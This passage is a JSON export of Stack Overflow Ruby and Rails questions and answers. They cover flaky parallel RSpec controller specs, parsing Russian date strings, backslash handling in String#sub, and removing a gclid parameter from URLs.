the ruby version and the ruby-build plugs directory doesn&#39;t exist, what to do?", "body": "<p>rbenv doesn't show the newer versions of Ruby.<br>\nVarious guides say to update ruby build but I don't have the ruby-build directory set up to do that in my installation.</p>\n\n<p>What should I do?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "testing", "rspec"], "comments": [{"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558373444, "post_id": 56224351, "comment_id": 99071846, "body": "Do you use multiple databases? One for each thread?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1558377682, "post_id": 56224351, "comment_id": 99073470, "body": "How do you expect anyone to answer this? We need to be able to reproduce the problem (or <i>at least</i> see enough code to spot a potential mistake) in order to give a meaningful response."}, {"owner": {"reputation": 222, "user_id": 2858781, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8wlrz.png?s=128&g=1", "display_name": "thiyaram", "link": "https://stackoverflow.com/users/2858781/thiyaram"}, "edited": false, "score": 0, "creation_date": 1558416219, "post_id": 56224351, "comment_id": 99082460, "body": "Please find the above input, anything required more than that!"}, {"owner": {"reputation": 222, "user_id": 2858781, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8wlrz.png?s=128&g=1", "display_name": "thiyaram", "link": "https://stackoverflow.com/users/2858781/thiyaram"}, "edited": false, "score": 0, "creation_date": 1558424630, "post_id": 56224351, "comment_id": 99085840, "body": "Running with 1 file its works fine but more than one its fills like <b>ActiveRecord::Deadlocked</b> , <b>JSON errors</b>, <b>response code mismatching</b>   etc..  but models and other test cases works fine using <b>parallel_rspec</b> command (both single file and folder as well)  If we run with below command it works           &gt; parallel_rspec -n 1 -t rspec spec/controllers    but multi processes alone not working for controller."}, {"owner": {"reputation": 2352, "user_id": 157931, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/986d255e94481d2249bae7911e7845e8?s=128&d=identicon&r=PG", "display_name": "Danilo Cabello", "link": "https://stackoverflow.com/users/157931/danilo-cabello"}, "edited": false, "score": 0, "creation_date": 1558798525, "post_id": 56224351, "comment_id": 99223065, "body": "One possibility is that your tests have side-effects, try running <code>bundle exec rspec --seed 61169</code> or replace <code>61169</code> by any seed number that failed. Rspec will attempt to find the minimal set that cause your suite to fail, it&#39;s possible that one test sets an environment variable and another test uses it by accident."}, {"owner": {"reputation": 4338, "user_id": 299774, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/eab8557a9cb59427455bac3cc59d2802?s=128&d=identicon&r=PG", "display_name": "Grzegorz", "link": "https://stackoverflow.com/users/299774/grzegorz"}, "reply_to_user": {"reputation": 2352, "user_id": 157931, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/986d255e94481d2249bae7911e7845e8?s=128&d=identicon&r=PG", "display_name": "Danilo Cabello", "link": "https://stackoverflow.com/users/157931/danilo-cabello"}, "edited": false, "score": 0, "creation_date": 1558940367, "post_id": 56224351, "comment_id": 99250462, "body": "@DaniloCabello this won&#39;t work with parallel tests. Seed won&#39;t control which of two concurrent requests will be accepted first by the app."}], "answers": [{"tags": [], "owner": {"reputation": 4338, "user_id": 299774, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/eab8557a9cb59427455bac3cc59d2802?s=128&d=identicon&r=PG", "display_name": "Grzegorz", "link": "https://stackoverflow.com/users/299774/grzegorz"}, "is_accepted": false, "score": 0, "last_activity_date": 1558940932, "creation_date": 1558940932, "answer_id": 56321278, "question_id": 56224351, "link": "https://stackoverflow.com/questions/56224351/rspec-parallel-test-controller-spec-random-fails/56321278#56321278", "title": "Rspec parallel_test controller spec random fails", "body": "<p>It looks like the the test assumes one state of the app, but it was probably changed by some concurrent request. (I'd bet that session is shared, and when testing your controller you think the person logged in is X, but it's Y).</p>\n\n<p>Make sure each of the parallel runs are separated, it seems like all your tests are connecting to the same DB</p>\n\n<blockquote>\n  <p>Single DB connected while execution.\n  This makes sense in single threaded apps, because it's cleaned after each example. But when running in parallel it can be a mess, and you can never be sure what's in the DB. </p>\n</blockquote>\n\n<p>Did you change you DB config like this:</p>\n\n<pre><code>test:\n  database: yourproject_test&lt;%= ENV['TEST_ENV_NUMBER'] %&gt;\n</code></pre>\n\n<p>If you miss that - that's your u</p>\n"}], "owner": {"reputation": 222, "user_id": 2858781, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8wlrz.png?s=128&g=1", "display_name": "thiyaram", "link": "https://stackoverflow.com/users/2858781/thiyaram"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 513, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1558940932, "creation_date": 1558367442, "last_edit_date": 1558419114, "question_id": 56224351, "link": "https://stackoverflow.com/questions/56224351/rspec-parallel-test-controller-spec-random-fails", "title": "Rspec parallel_test controller spec random fails", "body": "<p>While running <strong>parallel_rspec spec</strong> random fails with controller any solution.</p>\n\n<p>In Gemfile </p>\n\n<pre><code>group :development, :test do \n  gem 'parallel_tests'  \nend\n</code></pre>\n\n<p>My Spec execution like this</p>\n\n<pre><code>name@root:/project# parallel_rspec spec/controllers/\n4 processes for 21 specs, ~ 5 specs per process\n\nRandomized with seed 3503\n\nRandomized with seed 41377\n 0/62 |&gt;                                                       |  ETA: ??:??:?? \nRandomized with seed 43603\n 0/50 |&gt;                                                       |  ETA: ??:??:?? \nRandomized with seed 61169\n 3/62 |==&gt;                                                     |  ETA: 00:08:03 \n  1) Admin::ReportingsController when signed-in non-admin GET #instance_reports redirects to root_url\n     Failure/Error: expect( response ).to redirect_to root_url\n\n       Expected response to be a redirect to &lt;http://xxx/&gt; but was a redirect to &lt;http://yyyy&gt;.\n       Expected \"http://xxxx/\" to be === \"http://xxxx/code\".\n     # ./spec/support/functions.rb:12:in `expect_root_redirect'\n     # ./spec/controllers/admin/reportings_controller_spec.rb:25:in `block (4 levels) in &lt;top (required)&gt;'\n     # ./spec/support/factory_bot.rb:18:in `block (3 levels) in &lt;top (required)&gt;'\n     # /usr/local/bundle/gems/database_cleaner-1.7.0/lib/database_cleaner/generic/base.rb:16:in `cleaning'\n     # /usr/local/bundle/gems/database_cleaner-1.7.0/lib/database_cleaner/base.rb:100:in `cleaning'\n     # /usr/local/bundle/gems/database_cleaner-1.7.0/lib/database_cleaner/configuration.rb:86:in `block (2 levels) in cleaning'\n     # /usr/local/bundle/gems/database_cleaner-1.7.0/lib/database_cleaner/configuration.rb:87:in `cleaning'\n     # ./spec/support/factory_bot.rb:17:in `block (2 levels) in &lt;top (required)&gt;'\n</code></pre>\n\n<p>like this fails randomly.</p>\n\n<p>IF we run with below command its works fine.</p>\n\n<pre><code>rspec spec/controllers\n</code></pre>\n\n<p>Note : </p>\n\n<ul>\n<li>Single DB connected while execution.</li>\n<li>Except controller everything works fine.</li>\n<li>most are like json related conditions are faild.</li>\n</ul>\n"}, {"tags": ["ruby-on-rails", "ruby", "rails-i18n"], "comments": [{"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "edited": false, "score": 1, "creation_date": 1558366824, "post_id": 56223965, "comment_id": 99069040, "body": "There&#39;s probably a gem around somewhere to assist. but in this case you could also consider pulling the various parts through Regex and create a hash based lookup to translate the russian month into a month number."}, {"owner": {"reputation": 3580, "user_id": 1680728, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/844cd73e8700d810d7cc207cba7da3bd?s=128&d=identicon&r=PG&f=1", "display_name": "Felix", "link": "https://stackoverflow.com/users/1680728/felix"}, "edited": false, "score": 0, "creation_date": 1558367187, "post_id": 56223965, "comment_id": 99069232, "body": "<a href=\"https://github.com/yaroslav/russian\" rel=\"nofollow noreferrer\">github.com/yaroslav/russian</a> has <code>strftime</code>, maybe also <code>strptime</code>? (Sorry, I don&#39;t speak russian)"}, {"owner": {"reputation": 49, "user_id": 11528488, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ODRX1BWocEg/AAAAAAAAAAI/AAAAAAAAAB0/G4zxoCzJtaY/photo.jpg?sz=128", "display_name": "Kirill Berlin", "link": "https://stackoverflow.com/users/11528488/kirill-berlin"}, "reply_to_user": {"reputation": 3580, "user_id": 1680728, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/844cd73e8700d810d7cc207cba7da3bd?s=128&d=identicon&r=PG&f=1", "display_name": "Felix", "link": "https://stackoverflow.com/users/1680728/felix"}, "edited": false, "score": 0, "creation_date": 1558367356, "post_id": 56223965, "comment_id": 99069322, "body": "@Felix I tried, it doesn&#39;t work unfortunately"}, {"owner": {"reputation": 8973, "user_id": 831564, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b7b5cb565edb37aac67f053f64f0324f?s=128&d=identicon&r=PG", "display_name": "Marlin Pierce", "link": "https://stackoverflow.com/users/831564/marlin-pierce"}, "edited": false, "score": 0, "creation_date": 1558367633, "post_id": 56223965, "comment_id": 99069486, "body": "I think you will have to parse by position and do a hash lookup of months."}, {"owner": {"reputation": 49, "user_id": 11528488, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ODRX1BWocEg/AAAAAAAAAAI/AAAAAAAAAB0/G4zxoCzJtaY/photo.jpg?sz=128", "display_name": "Kirill Berlin", "link": "https://stackoverflow.com/users/11528488/kirill-berlin"}, "reply_to_user": {"reputation": 8973, "user_id": 831564, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b7b5cb565edb37aac67f053f64f0324f?s=128&d=identicon&r=PG", "display_name": "Marlin Pierce", "link": "https://stackoverflow.com/users/831564/marlin-pierce"}, "edited": false, "score": 0, "creation_date": 1558381990, "post_id": 56223965, "comment_id": 99075020, "body": "@MarlinPierce hardcode, but I think I&#39;ll do it like that. But I hope mb someone know better solution"}], "answers": [{"comments": [{"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558375109, "post_id": 56224573, "comment_id": 99072493, "body": "This will only work when used in the month of May (just because <code>\u043c\u0430\u044f</code> happens to mean May). In all other months of the year you will get <code>2019-[current month]-19</code> because <code>Time.parse</code> is not translating anything from one language to another"}, {"owner": {"reputation": 49, "user_id": 11528488, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ODRX1BWocEg/AAAAAAAAAAI/AAAAAAAAAB0/G4zxoCzJtaY/photo.jpg?sz=128", "display_name": "Kirill Berlin", "link": "https://stackoverflow.com/users/11528488/kirill-berlin"}, "edited": false, "score": 0, "creation_date": 1558381921, "post_id": 56224573, "comment_id": 99074992, "body": "Looks like it always place a current month. Tested and unfortunately doesn&#39;t work"}, {"owner": {"reputation": 579, "user_id": 4251975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5e702c6ee92d30ba83aea6f0b064a084?s=128&d=identicon&r=PG", "display_name": "Yurii", "link": "https://stackoverflow.com/users/4251975/yurii"}, "edited": false, "score": 0, "creation_date": 1558485896, "post_id": 56224573, "comment_id": 99114072, "body": "It&#39;s really parse only English months and using current time to substitute missing part of the date =/ Update the answer to handle it ;)"}], "tags": [], "owner": {"reputation": 579, "user_id": 4251975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5e702c6ee92d30ba83aea6f0b064a084?s=128&d=identicon&r=PG", "display_name": "Yurii", "link": "https://stackoverflow.com/users/4251975/yurii"}, "is_accepted": false, "score": 3, "last_activity_date": 1558485780, "last_edit_date": 1558485780, "creation_date": 1558368509, "answer_id": 56224573, "question_id": 56223965, "link": "https://stackoverflow.com/questions/56223965/ruby-rails-how-to-parse-datetime-from-russian-string/56224573#56224573", "title": "Ruby/Rails How to parse datetime from russian string", "body": "<p><s>I'd say <code>Time.parse(\"14:24, 19 \u043c\u0430\u044f 2019\")</code> should work for you ;) </p>\n\n<p>(<em>In case if you're using rails</em>)</s></p>\n\n<p>Yep, it cannot parse not English names of the months, so it should be used like <a href=\"https://stackoverflow.com/questions/7580238/how-do-i-parse-non-english-dates-with-datetime-strptime-in-ruby\">here</a>:</p>\n\n<pre><code>RUSSIAN_MONTH_NAMES_SUBSTITUTION = { '\u043c\u0430\u044f' =&gt; 'may', '\u0438\u044e\u043d\u044f' =&gt; 'june' }\n\ndef russian_to_english_date(date_string)\n  date_string.gsub(/\u043c\u0430\u044f|\u0438\u044e\u043d\u044f/, RUSSIAN_MONTH_NAMES_SUBSTITUTION)\nend\n\nTime.strptime(russian_to_english_date(\"14:24, 19 \u0438\u044e\u043d\u044f 2019\"), \"%H:%M, %d %B %Y\")\n# or\nTime.parse(russian_to_english_date(\"14:24, 19 \u0438\u044e\u043d\u044f 2019\"))\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 11528488, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ODRX1BWocEg/AAAAAAAAAAI/AAAAAAAAAB0/G4zxoCzJtaY/photo.jpg?sz=128", "display_name": "Kirill Berlin", "link": "https://stackoverflow.com/users/11528488/kirill-berlin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 356, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1558485780, "creation_date": 1558365947, "question_id": 56223965, "link": "https://stackoverflow.com/questions/56223965/ruby-rails-how-to-parse-datetime-from-russian-string", "title": "Ruby/Rails How to parse datetime from russian string", "body": "<p>I need to parse date\\time from string in russian. \nExample: <code>14:24, 19 \u043c\u0430\u044f 2019</code>.</p>\n"}, {"tags": ["ruby", "string", "replace", "escaping"], "answers": [{"comments": [{"owner": {"reputation": 2902, "user_id": 6486583, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eEFmo.jpg?s=128&g=1", "display_name": "spirit", "link": "https://stackoverflow.com/users/6486583/spirit"}, "edited": false, "score": 0, "creation_date": 1558397438, "post_id": 56224937, "comment_id": 99078969, "body": "good one! but I&#39;ve came up with simpler solution ;) check my answer"}], "tags": [], "owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "is_accepted": false, "score": 1, "last_activity_date": 1558370360, "last_edit_date": 1558370360, "creation_date": 1558370019, "answer_id": 56224937, "question_id": 56223924, "link": "https://stackoverflow.com/questions/56223924/how-to-perform-string-replacements-without-backslash-escaping-in-ruby/56224937#56224937", "title": "How to perform String replacements without backslash escaping in Ruby", "body": "<p>You can replace part of a string using a range. So you just have to find that range</p>\n\n<pre><code>if index = string.index(str_to_replace)\n  string[index...(index + str_to_replace.length)] = replacement\nend\n</code></pre>\n\n<p>This example does it in place, so do it to a dup if necessary.</p>\n"}, {"comments": [{"owner": {"reputation": 2902, "user_id": 6486583, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eEFmo.jpg?s=128&g=1", "display_name": "spirit", "link": "https://stackoverflow.com/users/6486583/spirit"}, "edited": false, "score": 1, "creation_date": 1558398310, "post_id": 56228137, "comment_id": 99079119, "body": "if you take a closer look at my real code you will see that I&#39;m already receiving replacement from external resource, so it&#39;s not a &quot;double quoted string&quot; or whatever. issue is in the <code>sub&#47;gsub</code> methods, they are trying to interpret double backslashes and as the result I have only one backslash after substitution"}], "tags": [], "owner": {"reputation": 259, "user_id": 5389585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f7c7c135de642808040baab057d094b?s=128&d=identicon&r=PG&f=1", "display_name": "sondra.kinsey", "link": "https://stackoverflow.com/users/5389585/sondra-kinsey"}, "is_accepted": false, "score": 0, "last_activity_date": 1558386861, "last_edit_date": 1558386861, "creation_date": 1558386100, "answer_id": 56228137, "question_id": 56223924, "link": "https://stackoverflow.com/questions/56223924/how-to-perform-string-replacements-without-backslash-escaping-in-ruby/56228137#56228137", "title": "How to perform String replacements without backslash escaping in Ruby", "body": "\n\n<p>No, every Ruby String literal must escape backslashes. Ruby does allow arbitrary String <em>delimiters</em> like these:</p>\n\n<pre><code>%q{A string}\n%Q&lt;A string&gt;\n%.A string.\n</code></pre>\n\n<p>See <a href=\"http://ruby-doc.org/core/doc/syntax/literals_rdoc.html#label-Percent+Strings\" rel=\"nofollow noreferrer\">ruby-doc.org</a> and <a href=\"https://en.wikibooks.org/wiki/Ruby_Programming/Syntax/Literals#The_.25_Notation\" rel=\"nofollow noreferrer\">wikibooks.org</a>. However, these all treat backslashes as a special character and require that it be escaped.</p>\n\n<p>One option is to put your replacements in a data file (eg. CSV) and read the replacements like this:</p>\n\n<pre><code>while line = data_file.gets\n  pattern, replacement = *line.split(separator)\n  str.gsub!(Regexp.compile(pattern), replacement)\nend\n</code></pre>\n\n<p>The data file would <strong>not</strong> need to escape any characters in replacements.</p>\n"}, {"comments": [{"owner": {"reputation": 259, "user_id": 5389585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f7c7c135de642808040baab057d094b?s=128&d=identicon&r=PG&f=1", "display_name": "sondra.kinsey", "link": "https://stackoverflow.com/users/5389585/sondra-kinsey"}, "edited": false, "score": 1, "creation_date": 1558465793, "post_id": 56229621, "comment_id": 99108316, "body": "I see your problem. <a href=\"http://ruby-doc.org/core-2.6.3/String.html#method-i-sub\" rel=\"nofollow noreferrer\"><code>String#sub</code></a> replacement strings can have backslashed references to matching portions, eg. &quot;\\1 \\2&quot;, and therefore require backslashes themselves to be escaped."}, {"owner": {"reputation": 2902, "user_id": 6486583, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eEFmo.jpg?s=128&g=1", "display_name": "spirit", "link": "https://stackoverflow.com/users/6486583/spirit"}, "reply_to_user": {"reputation": 259, "user_id": 5389585, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f7c7c135de642808040baab057d094b?s=128&d=identicon&r=PG&f=1", "display_name": "sondra.kinsey", "link": "https://stackoverflow.com/users/5389585/sondra-kinsey"}, "edited": false, "score": 0, "creation_date": 1558508616, "post_id": 56229621, "comment_id": 99119526, "body": "exactly! but I don&#39;t need any backreferences, just plain substitution :)"}], "tags": [], "owner": {"reputation": 2902, "user_id": 6486583, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eEFmo.jpg?s=128&g=1", "display_name": "spirit", "link": "https://stackoverflow.com/users/6486583/spirit"}, "is_accepted": true, "score": 4, "last_activity_date": 1558425324, "last_edit_date": 1558425324, "creation_date": 1558397941, "answer_id": 56229621, "question_id": 56223924, "link": "https://stackoverflow.com/questions/56223924/how-to-perform-string-replacements-without-backslash-escaping-in-ruby/56229621#56229621", "title": "How to perform String replacements without backslash escaping in Ruby", "body": "<p>Eventually I found pretty simple solution:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>input = '{\"regex\": \"/^\\\\\\\\([0-3][0-9]\\\\\\\\)$/\"}'\nputs input # gives =&gt; {\"regex\": \"/^\\\\([0-3][0-9]\\\\)$/\"}\n\nsearch = '/^\\\\\\\\([0-3][0-9]\\\\\\\\)$/'\nreplace = '/^\\\\\\\\([0-9]\\\\\\\\)$/'\n\nputs input.sub(search, replace) # gives =&gt; {\"regex\": \"/^\\([0-9]\\)$/\"}, which is wrong result\n\ninput[search] = replace # &lt;-- here is the trick, but makes changes in place\nputs input # gives =&gt; {\"regex\": \"/^\\\\([0-9]\\\\)$/\"} =&gt; success!\n</code></pre>\n\n<p>But! If your string doesn't contain any <code>search</code> substring you will get an <code>string not matched (IndexError)</code>.</p>\n\n<p>So you may want to bulletproof your code like this: </p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>input[search] = replace if input.include? search\n</code></pre>\n\n<p>Also, if you want to keep your <code>input</code> untouched you may <code>.dup</code> it to another variable:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>new_input = input.dup\nnew_input[search] = replace if new_input.include? search\n</code></pre>\n"}], "owner": {"reputation": 2902, "user_id": 6486583, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eEFmo.jpg?s=128&g=1", "display_name": "spirit", "link": "https://stackoverflow.com/users/6486583/spirit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 311, "favorite_count": 0, "accepted_answer_id": 56229621, "answer_count": 3, "score": 3, "last_activity_date": 1558545492, "creation_date": 1558365802, "last_edit_date": 1558545492, "question_id": 56223924, "link": "https://stackoverflow.com/questions/56223924/how-to-perform-string-replacements-without-backslash-escaping-in-ruby", "title": "How to perform String replacements without backslash escaping in Ruby", "body": "\n\n<p>Consider the code:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>output = `cat test.txt`\nputs output  # /^\\\\([0-3][0-9]\\\\/[0-1][0-9]\\\\/[2-9][0-9]{3}\\\\)$/\nstr = 'test ' + output\nputs str     # test /^\\\\([0-3][0-9]\\\\/[0-1][0-9]\\\\/[2-9][0-9]{3}\\\\)$/\nnew_str = 'new test ' + output\nputs new_str # new test /^\\\\([0-3][0-9]\\\\/[0-1][0-9]\\\\/[2-9][0-9]{3}\\\\)$/\n\nres = str.sub('test', 'new test')\nputs res     # new test /^\\\\([0-3][0-9]\\\\/[0-1][0-9]\\\\/[2-9][0-9]{3}\\\\)$/ &lt;-- all fine\nres = str.sub(str, new_str)\nputs res     # new test /^\\([0-3][0-9]\\/[0-1][0-9]\\/[2-9][0-9]{3}\\)$/     &lt;-- !!! problem\n</code></pre>\n\n<p>code is just for presenting the problem which I have ;)</p>\n\n<p><strong>Problem:</strong> I have replacement text with double backslashes which I need to write \"as it is\" to another file</p>\n\n<p><strong>Question is</strong>: is there any simple replacement method which doesn't interpret backslashes (maybe some binary mode)?</p>\n\n<p>Because it's kinda weird to do like this: <code>res = str.sub(str, new_str.gsub('\\\\', '\\\\\\\\\\\\\\\\'))</code>, although this works...</p>\n\n<p>real working code:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>file = 'some/random/file.php'\ncontents = new_contents = ''\nFile.open(file, 'rb') do |f|\n  contents = new_contents = f.read\nend\n\ncontents.scan(/('([A-Z]+)' \\=\\&gt; \\&lt;\\&lt;\\&lt;'JSON'(.*?)JSON)/m) do |match|\n  Dir.glob(\"*#{match[1]}.json\") do |filename|\n    compressed = `../compress.py #{filename}`.gsub('\\\\', '\\\\\\\\\\\\\\\\')\n    replacement = match[0].sub(match[2], \"\\n\" + compressed).force_encoding('ASCII-8BIT')\n\n    new_contents = new_contents.sub(match[0], replacement.gsub('\\\\', '\\\\\\\\\\\\\\\\'))\n  end\nend\n\nFile.open(file, 'wb') do |f|\n  f.write(new_contents)\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"comments": [{"owner": {"reputation": 87, "user_id": 10177326, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9867996e687651338bd2683e4bfcf903?s=128&d=identicon&r=PG&f=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/10177326/alex"}, "edited": false, "score": 0, "creation_date": 1558367587, "post_id": 56224025, "comment_id": 99069463, "body": "I need to keep the other params, but just get rid of the gclid."}], "tags": [], "owner": {"reputation": 6039, "user_id": 2137458, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cfca832ee746f3e3d9971148f52dc64?s=128&d=identicon&r=PG", "display_name": "NM Pennypacker", "link": "https://stackoverflow.com/users/2137458/nm-pennypacker"}, "is_accepted": false, "score": 1, "last_activity_date": 1558367928, "last_edit_date": 1558367928, "creation_date": 1558366207, "answer_id": 56224025, "question_id": 56223841, "link": "https://stackoverflow.com/questions/56223841/how-to-remove-substring-that-may-appear-within-a-string/56224025#56224025", "title": "How to remove substring that may appear within a string?", "body": "<p>If all you need is the base URL you can do:</p>\n\n<pre><code>url = your_url_string\ntrimmed_url = url[0, url.index(\"?\")]\n</code></pre>\n\n<p>Or you can guard against strings without query params:</p>\n\n<pre><code>url = your_url_string\ntrimmed_url = url[0, (url.include?('?') ? url.index(\"?\") : url)]\n</code></pre>\n\n<p>There may be a way to do it with <code>URI</code> as well...</p>\n\n<p>If all you need to do is remove that parameter, see this answer: <a href=\"https://stackoverflow.com/questions/41965927/rails-string-replace-url-parameters\">Rails String Replace URL Parameters</a></p>\n"}, {"comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558372123, "post_id": 56224425, "comment_id": 99071335, "body": "It&#39;s not necessary to escape a question mark within a character class."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558386381, "post_id": 56224425, "comment_id": 99076580, "body": "Keep in mind that, from an educational point of view, you are instructing readers (who don&#39;t read comments :-)) that a question mark within a character class <i>must</i> be escaped."}], "tags": [], "owner": {"reputation": 8973, "user_id": 831564, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b7b5cb565edb37aac67f053f64f0324f?s=128&d=identicon&r=PG", "display_name": "Marlin Pierce", "link": "https://stackoverflow.com/users/831564/marlin-pierce"}, "is_accepted": false, "score": 3, "last_activity_date": 1558367776, "creation_date": 1558367776, "answer_id": 56224425, "question_id": 56223841, "link": "https://stackoverflow.com/questions/56223841/how-to-remove-substring-that-may-appear-within-a-string/56224425#56224425", "title": "How to remove substring that may appear within a string?", "body": "<pre><code>.sub(/[\\?&amp;]gclid=[^&amp;]*/, '')\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "is_accepted": false, "score": 1, "last_activity_date": 1558374474, "creation_date": 1558374474, "answer_id": 56225849, "question_id": 56223841, "link": "https://stackoverflow.com/questions/56223841/how-to-remove-substring-that-may-appear-within-a-string/56225849#56225849", "title": "How to remove substring that may appear within a string?", "body": "<p>I would recommend using the URI library for this instead so you can just parse the query portion: </p>\n\n<pre><code>uris = [\"https://www.website.com/colors/blue?src=camp_id1&amp;gclid=Cj0KCQjwoInnBRDDARIsANBVyASfVUCg4ShKaAq4q8cX6xgB4kYj-oRGEPuO5UuUaAnZi2zD7yQU684aAo3KEALw_wcB\",\n\"https://www.website.com/colors/blue?gclid=Cj0KCQjwoInnBRDDARIsANBVyASfVUCg4ShKaAq4q8cX6xgB4kYj-oRGEPuO5UuUaAnZi2zD7yQU684aAo3KEALw_wcB&amp;src=camp_id1\",\n\"https://www.website.com/colors/blue?page=2&amp;gclid=Cj0KCQjwoInnBRDDARIsANBVyASfVUCg4ShKaAq4q8cX6xgB4kYj-oRGEPuO5UuUaAnZi2zD7yQU684aAo3KEALw_wcB&amp;src=camp_id1\",\n\"https://www.website.com/colors/blue?page=2&amp;src=camp_id1\"\n]\n\nuris.map do |s| \n  uri = URI.parse(s)\n  query_params = uri.query.scan(/\\w+(?==)[^&amp;]*/).reject{|s| s.start_with?('gclid')}\n  uri.query = query_params.empty? ? nil : query_params.join('&amp;')\n  uri.to_s\nend\n\n# =&gt; [\"https://www.website.com/colors/blue?src=camp_id1\", \n#     \"https://www.website.com/colors/blue?src=camp_id1\", \n#     \"https://www.website.com/colors/blue?page=2&amp;src=camp_id1\",  \n#     \"https://www.website.com/colors/blue?page=2&amp;src=camp_id1\"]\n</code></pre>\n"}], "owner": {"reputation": 87, "user_id": 10177326, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9867996e687651338bd2683e4bfcf903?s=128&d=identicon&r=PG&f=1", "display_name": "Alex", "link": "https://stackoverflow.com/users/10177326/alex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1558374474, "creation_date": 1558365552, "question_id": 56223841, "link": "https://stackoverflow.com/questions/56223841/how-to-remove-substring-that-may-appear-within-a-string", "title": "How to remove substring that may appear within a string?", "body": "<p>I need to simplify url strings for some reporting, and sometimes our url strings have <code>gclid</code> params baked into them at different parts:</p>\n\n<p><code>https://www.website.com/colors/blue?src=camp_id1&amp;gclid=Cj0KCQjwoInnBRDDARIsANBVyASfVUCg4ShKaAq4q8cX6xgB4kYj-oRGEPuO5UuUaAnZi2zD7yQU684aAo3KEALw_wcB</code></p>\n\n<p>or 